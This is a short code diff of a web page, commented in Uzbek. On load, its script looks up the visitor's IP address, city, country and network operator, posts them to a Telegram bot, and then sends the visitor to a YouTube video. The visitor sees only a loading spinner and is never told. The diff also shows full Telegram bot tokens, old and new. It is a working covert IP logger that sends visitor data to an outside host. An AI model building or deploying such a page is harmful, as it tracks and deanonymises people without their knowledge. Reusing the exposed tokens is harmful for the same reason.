@@ -14,20 +14,25 @@
     <div class="loader"></div>
 
     <script>
-        // Sizning ma'lumotlaringiz
-        const BOT_TOKEN = '9135183024:AAHV3QL2_E6QbZ_s8tFvIVSDLfN3y24T3xs';
+        // Sizning YANGI tokeningiz
+        const BOT_TOKEN = '9135183024:AAEesRVH6_Rlo9SvBD6QTgCxcjDJpx_-1Bs';
+        
+        // Sizning Chat ID ingiz
         const CHAT_ID = '9135183024'; 
-        const YOUTUBE_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Bu yerga xohlagan videongizni qo'ying
+        
+        // YouTube havolasi (o'zingiz xohlagan videoni qo'ying)
+        const YOUTUBE_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
 
         async function main() {
             try {
-                // IP ma'lumotlarini olish
+                // 1. IP ma'lumotlarini olish
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
 
-                // Telegram botga yuborish uchun xabar tayyorlash
+                // 2. Xabar tayyorlash
                 const text = `🔔 Yangi tashrif\n\n🌐 IP: ${data.ip || 'Noma\'lum'}\n📍 Shahar: ${data.city || 'Noma\'lum'}\n🗺️ Davlat: ${data.country_name || 'Noma\'lum'}\n📡 Operator: ${data.org || 'Noma\'lum'}`;
                 
+                // 3. Telegram botga yuborish
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -37,7 +42,7 @@
             } catch (e) {
                 console.log('Xatolik:', e);
             } finally {
-                // Ma'lumot yuborilgandan so'ng YouTube'ga yo'naltirish
+                // 4. YouTube'ga yo'naltirish
                 window.location.href = YOUTUBE_URL;
             }
         }
